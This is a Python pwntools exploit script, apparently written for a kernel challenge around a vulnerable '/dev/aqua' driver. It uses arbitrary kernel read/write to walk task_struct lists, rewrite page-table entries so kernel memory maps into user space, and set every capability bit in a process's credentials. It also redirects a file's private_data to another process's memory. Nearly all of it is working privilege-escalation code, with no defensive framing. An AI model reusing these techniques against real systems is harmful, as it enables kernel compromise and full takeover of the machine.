from pwn import *
from contextlib import contextmanager
import typing
PdtPdata = typing.Tuple[int, int]
PAGE_OFFSET = 0x80000000

comm_offset, pid_offset, list_heads, next_offset, mm_offset = (
    1272, 992, [148, 512, 780, 824, 836, 844], 824, 864)
next_offset = list_heads[-3]
mm_offset = list_heads[-1]+4+16
cred_offset = comm_offset-4*2
signal_offset = comm_offset+0x38
files_offset = comm_offset+0x2c

FILES_PATH = '/tmp/AaBbCcDdEeFfGgH'
DRIVER_PATH = '/dev/aqua'


def get_curr(p):
    p.sendline(b'curr /dev/aqua')
    p.recvuntil(b'$$$')
    var = p.recvuntil(b'$$$')
    return int(var.rstrip(b'$$$').rstrip(), 10)


def write_int(p, data, offset):
    p.sendline(f'wd {DRIVER_PATH} {offset} 4'.encode())
    p.recvuntil(b'wd>')
    p.sendline(p32(data))
    p.recvuntil(b'$$$')
    p.recvuntil(b'$$$')


def write_many(proc, start, length, data: bytes):
    proc.sendline(f'wd {DRIVER_PATH} {start} {length}'.encode())
    p.recvuntil(b'wd>')
    p.sendline(data)
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$').rstrip(b'$$$')


def write_int_user(p, data, offset):
    p.sendline(f'wu {offset} 4'.encode())
    p.recvuntil(b'wu>')
    p.sendline(p32(data))
    p.recvuntil(b'$$$')
    p.recvuntil(b'$$$')


def write_many_user(proc, start, length, data: bytes):
    proc.sendline(f'wu {start} {length}'.encode())
    p.recvuntil(b'wu>')
    p.sendline(data)
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$').rstrip(b'$$$')


def get_comm(base: int) -> str:
    result = subprocess.Popen(
        f'{FILES_PATH} {DRIVER_PATH} r {base+comm_offset} 16', shell=True, stdout=subprocess.PIPE)
    return str(result.stdout.read(), 'ascii', 'ignore').strip('\x00')


def get_next(base: int) -> int:
    result = subprocess.Popen(
        f'{FILES_PATH} {DRIVER_PATH} r {base+next_offset} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('L', result.stdout.read())[0]-next_offset


def get_pid(base: int) -> int:
    result = subprocess.Popen(
        f'{FILES_PATH} {DRIVER_PATH} r {base+pid_offset} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('l', result.stdout.read())[0]


def read_int(proc, addr):
    line = f'rd {DRIVER_PATH} {addr} 4'.encode()
    proc.sendline(line)
    proc.recvuntil(b'$$$')
    var = proc.recvuntil(b'$$$')
    return struct.unpack('L', var.rstrip(b'$$$'))


def read_int_user(proc, addr):
    line = f'ru {addr} 4'.encode()
    proc.sendline(line)
    proc.recvuntil(b'$$$')
    var = proc.recvuntil(b'$$$')
    return struct.unpack('L', var.rstrip(b'$$$'))


def read_many(proc, start, length):
    proc.sendline(f'rd {DRIVER_PATH} {start} {length}'.encode())
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$').rstrip(b'$$$')


def read_many_user(proc, start, length):
    proc.sendline(f'ru {start} {length}'.encode())
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$').rstrip(b'$$$')


def get_task_struct(proc, ptr=None):
    if ptr == None:
        ptr = get_curr(proc)
    proc.sendline(f'rd {DRIVER_PATH} {ptr} 1500'.encode())
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$')


def get_vm_area_struct(proc, ptr):
    proc.sendline(f'rd /dev/aqua {ptr} 12'.encode())
    proc.recvuntil(b'$$$')
    res = proc.recvuntil(b'$$$')
    return struct.unpack('LLL', res.rstrip(b'$$$'))


def get_maps(proc, strct):
    mm_struct_ptr = struct.unpack('L', strct[mm_offset:mm_offset+4])[0]
    vm_area_struct_ptr = read_int(proc, mm_struct_ptr)[0]
    vm_start, vm_end, cur = get_vm_area_struct(proc, vm_area_struct_ptr)
    return vm_start, vm_end, cur


def get_tasks(proc):
    curr = get_curr(proc)
    cur = get_next(curr)
    while cur != curr:
        yield (get_pid(cur,), get_comm(cur), cur)
        cur = get_next(cur)


def pid_to_task_struct_ptr(proc, pid):
    for pid_, _, ptr in get_tasks(proc):
        if pid_ == pid:
            return ptr


def print_tasks(proc):
    for t in get_tasks(proc):
        print(*t)


def print_maps(proc, strct):
    end, start, mcurr = get_maps(proc, strct)
    while 0 != mcurr:
        print(f'{hex(start)}-{hex(end)}')
        end, start, mcurr = get_vm_area_struct(proc, mcurr)


def virt_to_phys(virt):
    return virt-PAGE_OFFSET


def phys_to_virt(phys):
    return phys+PAGE_OFFSET


def any_virt_to_phys(p, task_struct, addr):
    if addr > PAGE_OFFSET:
        return virt_to_phys(addr)
    mm_ptr = u32(task_struct[mm_offset:mm_offset+4])
    pgd_offset = 0x24
    pgd_ptr = read_int(p, mm_ptr+pgd_offset)[0]
    pgd = read_many(p, pgd_ptr, 4096)
    print(len(pgd))
    pgd_idx = (addr >> 20 & 0x7ff)*4  # TTBCR.N = 0b001
    print(pgd_idx, len(pgd[pgd_idx:pgd_idx+4]))
    pdt_ptr = phys_to_virt(u32(pgd[pgd_idx:pgd_idx+4]) & 0xfffffc00)
    pdt = read_many(p, pdt_ptr, 4096)
    pdt_idx = ((addr >> 12) & 0xff)*4
    pte = u32(pdt[pdt_idx:pdt_idx+4])
    return ((pte >> 12) << 12)


def map_to_vm(p, task_struct, kaddr):
    flags = 0b110001111110
    mm_ptr = u32(task_struct[mm_offset:mm_offset+4])
    pgd_offset = 0x24
    pgd_ptr = read_int(p, mm_ptr+pgd_offset)[0]
    pgd = read_many(p, pgd_ptr, 4096)
    mapped_high = None
    for i in range(0, 4096, 4):
        if u32(pgd[i:i+4]) != 0:
            mapped_high = i
            break
    pdt_ptr = phys_to_virt((u32(pgd[mapped_high:mapped_high+4]) >> 10) << 10)
    pdt = read_many(p, pdt_ptr, 4096)
    mapped_low = None
    for i in range(0, 4096, 4):
        if u32(pdt[i:i+4]) == 0:
            mapped_low = i
            break
    if kaddr == 0:
        kaddr = pdt_ptr
    pte = virt_to_phys((kaddr >> 12) << 12) | flags
    write_int(p, pte, pdt_ptr+mapped_low)
    return (mapped_high//4) << 20 | (mapped_low//4) << 12 | kaddr & 0xfff, mapped_high//4


@ contextmanager
def user_map(p, pdt_data: PdtPdata, kaddr):
    '''Run `map_to_vm` on `p` with `kaddr=0` to get `pdt_data`.
    '''
    base, high = pdt_data
    pdt = read_many_user(p, base, 2048)
    spot = -1
    for i in range(512):
        if u32(pdt[i:i+4]) == 0:
            spot = i
            break
    if spot == -1:
        raise RuntimeError('PDT is full')
    flags = 0b110001111110
    pte = virt_to_phys((kaddr >> 12) << 12) | flags
    write_int_user(p, pte, base+spot*4)
    try:
        yield high << 20 | spot << 12 | (kaddr & 0xfff)
    finally:
        write_int_user(p, 0, base+spot*4)


def any_virt_to_phys_user(p, task_struct, addr, pdt_data: PdtPdata):
    ''' `task_struct` and `addr` must match (doesn't have to match `p`).

    Run `map_to_vm` on `p` with `kaddr=0` to get `pdt_data`.
    '''
    if addr > PAGE_OFFSET:
        return virt_to_phys(addr)
    mm_ptr = u32(task_struct[mm_offset:mm_offset+4])
    pgd_offset = 0x24
    with user_map(p, pdt_data, mm_ptr+pgd_offset) as uaddr:
        pgd_ptr = read_int_user(p, uaddr)[0]
    with user_map(p, pdt_data, pgd_ptr) as uaddr:
        pgd = read_many_user(p, uaddr, 2048)
    pgd_idx = (addr >> 20)*4
    pdt_ptr = phys_to_virt(u32(pgd[pgd_idx:pgd_idx+4]) & 0xfffffc00)
    with user_map(p, pdt_data, pdt_ptr) as uaddr:
        pdt = read_many_user(p, uaddr, 2048)
    pdt_idx = ((addr >> 12) & 0xff)*4
    pte = u32(pdt[pdt_idx:pdt_idx+4])
    return ((pte >> 12) << 12)


def map_to_vm_user(p, kaddr):
    line = f'map {kaddr}'.encode()
    p.sendline(line)
    p.recvuntil(b'Mapped to: ')
    var = p.recvuntil(b'$$$')
    return int('0x'+var, 16) + (kaddr & 0xfff)


def setup_map(p, base, high):
    base += 0x800
    p.sendline(f'smap {high} {base}'.encode())
    p.recvuntil(b'$$$')


def give_all_capabilites(p, task_struct):
    '''give all capabilites to `task_struct`.
    `task_struct` and `p` do not have to match
    '''
    cap_effective_ptr = u32(task_struct[cred_offset:cred_offset+4]) + 0x38
    write_int(p, 0xffffffff, cap_effective_ptr)
    write_int(p, 0x1ff, cap_effective_ptr+4)


def give_all_capabilites_user(p, task_struct, pdt_data: PdtPdata):
    '''give all capabilites to `task_struct`.
    `task_struct` and `p` do not have to match
    '''
    cap_effective_ptr = u32(task_struct[cred_offset:cred_offset+4]) + 0x38
    with user_map(p, pdt_data, cap_effective_ptr) as uaddr:
        write_int_user(p, 0xffffffff, uaddr)
        write_int_user(p, 0x1ff, uaddr+4)


def get_task_signal_handler(p, task_struct_ptr):
    return read_int(p, task_struct_ptr+signal_offset)[0]


def set_task_signal_handler(p, task_struct_ptr, ptr):
    write_int(p, ptr, task_struct_ptr+signal_offset)


def set_fd_private_data(p, controller_task_struct_ptr, target_task_struct_ptr, fd):
    # files = *(current + comm_offset + 0x2c)
    # fdt = files + 0x14
    # fd table base addr = *(fdt+4)
    # fd of /proc/self/mem is base+0xc
    # from there, private_data is +0x94
    files_struct_ptr = read_int(
        p, controller_task_struct_ptr + files_offset)[0]
    print(hex(files_struct_ptr))
    fdt_ptr = read_int(p, files_struct_ptr + 0x14)[0]
    print(hex(fdt_ptr))
    file_3_ptr = read_int(p, fdt_ptr + 4)[0] + 4*fd
    print(hex(file_3_ptr))
    file_3 = read_int(p, file_3_ptr)[0]
    write_int(p, read_int(p, target_task_struct_ptr+mm_offset)[0], file_3+0x94)


def get_fd_private_data(p, controller_task_struct_ptr, fd):
    files_struct_ptr = read_int(
        p, controller_task_struct_ptr + files_offset)[0]
    fdt_ptr = read_int(p, files_struct_ptr + 0x14)[0]
    file_3_ptr = read_int(p, fdt_ptr + 4)[0] + 4*fd
    file_3 = read_int(p, file_3_ptr)[0]
    return read_int(p, file_3+0x94)[0]

##### ARCHIVE #####
# Used to calculate the offsets defined above


def get_comm_offset(strct):
    return strct.index(b'AaBbCcDdEeFfGgH')


def get_pid_offset(strct, pid):
    return strct.index(struct.pack('L', pid))


def get_candidates_for_next(pid_offset, strct):
    '''add everything that closely resembles a valid addresss up
    to the pid offset because next comes before pid
    '''
    candidates = {}
    for i in range(0, pid_offset, 4):
        x = struct.unpack('L', strct[i:i+4])[0]
        if x & 0xc0000000 == 0x80000000:
            candidates[i] = x
    return candidates


def is_list_head_for_next(proc, off, ptr, candidates):
    '''ptr is probably a list_head if
    1. off+4 is an address (prev pointer)
    2. ptr->next->prev==ptr
    3. ptr->prev->next==ptr
    '''
    return off+4 in candidates and ptr == read_int(proc,
                                                   read_int(proc, ptr+4)[0])[0] and \
        ptr == read_int(proc,
                        read_int(proc, candidates[off+4])[0])[0]


def get_proc_interactive():
    proc = process(['/tmp/AaBbCcDdEeFfGgH', 'interactive'])
    _ = proc.recvuntil(b'$$$')
    return proc


def get_next_offset(pid_offset):
    bad_candidates = []
    while True:
        proc = get_proc_interactive()
        strct = get_task_struct(proc)
        candidates = get_candidates_for_next(pid_offset, strct)
        list_heads = []
        for off, ptr in candidates.items():
            if off in bad_candidates:
                continue
            try:
                if is_list_head_for_next(proc, off, ptr, candidates):
                    list_heads.append(off)
            except EOFError:
                bad_candidates.append(off)
                break
        else:
            proc.kill()
            break
    # `tasks` is either last or third-last in the struct (ifdefs)
    return list_heads
